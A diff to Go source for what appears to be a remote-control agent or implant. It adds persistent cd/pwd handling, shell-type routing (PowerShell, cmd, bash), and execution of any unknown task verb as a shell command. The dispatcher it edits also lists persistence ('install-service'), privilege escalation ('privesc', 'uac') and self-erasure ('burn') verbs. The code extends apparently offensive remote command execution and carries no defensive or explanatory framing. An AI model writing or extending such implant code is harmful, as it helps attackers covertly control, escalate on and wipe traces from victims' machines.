@@ -33,10 +33,79 @@ func truncateOutput(s string) string {
 	return s[:maxOutputBytes] + "\n...[truncated: output exceeded 256KiB]"
 }
 
+// tryCwdBuiltin handles cd/pwd so the agent's working directory persists across
+// one-shot shell tasks (each task is a new process).
+func (a *Agent) tryCwdBuiltin(line string) (handled bool, exitCode int32, stdout, stderr string) {
+	line = strings.TrimSpace(line)
+	if line == "" {
+		return false, 0, "", ""
+	}
+	lower := strings.ToLower(line)
+	switch {
+	case lower == "pwd", lower == "cwd":
+		a.ensureCwd()
+		return true, 0, a.Cwd, ""
+	case lower == "cd", strings.HasPrefix(lower, "cd "):
+		target := ""
+		if len(line) > 2 {
+			target = strings.TrimSpace(line[2:])
+			// Windows cmd: cd /d D:\path — strip /d for our path resolver.
+			if len(target) >= 2 && (target[0] == '/' || target[0] == '-') {
+				fields := strings.Fields(target)
+				if len(fields) > 0 && strings.EqualFold(strings.TrimLeft(fields[0], "/-"), "d") {
+					target = strings.TrimSpace(strings.TrimPrefix(target, fields[0]))
+				}
+			}
+		}
+		next, err := a.changeDirectory(target)
+		if err != nil {
+			return true, 1, "", err.Error()
+		}
+		return true, 0, next, ""
+	default:
+		return false, 0, "", ""
+	}
+}
+
+// classifyShellLine picks an OS shell kind from an explicit prefix (powershell, cmd, bash, …).
+// Unprefixed lines use the platform default (cmd on Windows, $SHELL on Unix).
+func classifyShellLine(line string) (kind, command string) {
+	line = strings.TrimSpace(line)
+	if line == "" {
+		return "default", ""
+	}
+	fields := strings.Fields(line)
+	head := strings.ToLower(fields[0])
+	rest := strings.TrimSpace(line[len(fields[0]):])
+	switch head {
+	case "powershell", "pwsh", "ps":
+		if rest == "" {
+			return "powershell", ""
+		}
+		return "powershell", rest
+	case "cmd":
+		if rest == "" {
+			return "cmd", ""
+		}
+		return "cmd", rest
+	case "bash", "sh":
+		if rest == "" {
+			return head, ""
+		}
+		return head, rest
+	default:
+		return "default", line
+	}
+}
+
 func (a *Agent) runShell(ctx context.Context, taskID, kind, line string) (exitCode int32, stdout, stderr string) {
 	line = strings.TrimSpace(line)
 	if line == "" {
 		return 1, "", "empty command"
+	}
+
+	if handled, code, out, errOut := a.tryCwdBuiltin(line); handled {
+		return code, out, errOut
 	}
 
 	if a.Transport != nil && taskID != "" {
@@ -151,14 +220,13 @@ func (a *Agent) runTask(ctx context.Context, t *agentv1.Task) (exitCode int32, s
 			return 1, "", err.Error()
 		}
 		return 0, next, ""
-	case "shell", "run":
-		return a.runShell(ctx, taskID, "default", commandLine("", args))
-	case "cmd":
-		return a.runShell(ctx, taskID, "cmd", commandLine("", args))
-	case "powershell", "ps", "pwsh":
-		return a.runShell(ctx, taskID, "powershell", commandLine("", args))
-	case "bash", "sh":
-		return a.runShell(ctx, taskID, name, commandLine("", args))
+	case "shell", "run", "cmd", "powershell", "ps", "pwsh", "bash", "sh":
+		line := commandLine("", args)
+		if name == "shell" || name == "run" || name == "" {
+			kind, command := classifyShellLine(line)
+			return a.runShell(ctx, taskID, kind, command)
+		}
+		return a.runShell(ctx, taskID, name, line)
 	case "persist", "install-service":
 		return a.runPersist()
 	case "cleanup", "uninstall-all", "burn":
@@ -168,6 +236,7 @@ func (a *Agent) runTask(ctx context.Context, t *agentv1.Task) (exitCode int32, s
 	case "elevate", "privesc", "uac":
 		return a.runElevate(ctx, taskID, args)
 	default:
+		// Unknown verbs run as a native shell line (name + args).
 		return a.runShell(ctx, taskID, "default", commandLine(t.GetName(), args))
 	}
 }
